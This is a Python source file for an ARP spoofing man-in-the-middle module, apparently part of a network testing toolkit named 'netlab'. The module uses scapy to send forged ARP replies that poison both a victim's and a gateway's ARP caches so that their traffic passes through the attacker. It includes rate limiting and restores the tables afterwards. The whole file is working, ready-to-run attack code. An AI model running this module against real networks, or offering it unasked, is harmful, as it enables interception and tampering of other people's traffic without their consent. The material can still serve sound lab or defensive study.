"""ARP spoofing / MITM module."""

from __future__ import annotations

import time
from typing import Any

from scapy.all import ARP, Ether, sendp, getmacbyip, conf  # type: ignore

from netlab.base import BaseModule, ModuleParam


class ArpSpoof(BaseModule):
    name = "arp_spoof"
    description = "ARP spoofing (MITM) between victim and gateway"
    category = "l2"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(
                name="victim",
                type="ip",
                label="Victim IP",
                required=True,
            ),
            ModuleParam(
                name="gateway",
                type="ip",
                label="Gateway IP",
                required=True,
            ),
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=60,
                description="0 = run until Ctrl+C",
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=5,
                description="How many ARP replies per second (keep low)",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        victim_ip = params["victim"]
        gateway_ip = params["gateway"]
        iface = params["interface"]
        duration = int(params.get("duration", 60))

        conf.iface = iface
        conf.verb = 0

        print("── ARP spoof (MITM) ──")
        print("  Resolving MAC addresses...")
        victim_mac = getmacbyip(victim_ip)
        gateway_mac = getmacbyip(gateway_ip)

        if not victim_mac:
            raise RuntimeError(f"Could not resolve MAC for victim {victim_ip}")
        if not gateway_mac:
            raise RuntimeError(f"Could not resolve MAC for gateway {gateway_ip}")

        print(f"  Victim   {victim_ip} → {victim_mac}")
        print(f"  Gateway  {gateway_ip} → {gateway_mac}")
        print(
            f"  Starting on {iface} "
            f"(duration={duration if duration > 0 else 'inf'}s)"
        )

        # Tell victim that we are the gateway
        pkt_to_victim = Ether(dst=victim_mac) / ARP(
            op=2,  # is-at
            pdst=victim_ip,
            hwdst=victim_mac,
            psrc=gateway_ip,
        )
        # Tell gateway that we are the victim
        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=victim_ip,
        )

        start = time.time()
        try:
            while not self.should_stop():
                rate_limiter.wait()
                sendp(pkt_to_victim, iface=iface, verbose=0)
                logger.add_packets(1, len(bytes(pkt_to_victim)))

                rate_limiter.wait()
                sendp(pkt_to_gateway, iface=iface, verbose=0)
                logger.add_packets(1, len(bytes(pkt_to_gateway)))

                if duration > 0 and (time.time() - start) >= duration:
                    break

        except KeyboardInterrupt:
            print("\n[arp_spoof] Interrupted by user")

        finally:
            # Restore ARP tables (best effort)
            print("[arp_spoof] Restoring ARP tables...")
            restore_victim = Ether(dst=victim_mac) / ARP(
                op=2,
                pdst=victim_ip,
                hwdst=victim_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac,
            )
            restore_gateway = Ether(dst=gateway_mac) / ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=victim_ip,
                hwsrc=victim_mac,
            )
            for _ in range(3):
                sendp(restore_victim, iface=iface, verbose=0)
                sendp(restore_gateway, iface=iface, verbose=0)
                logger.add_packets(
                    2, len(bytes(restore_victim)) + len(bytes(restore_gateway))
                )
                time.sleep(0.3)

            print("── ARP spoof finished ──")
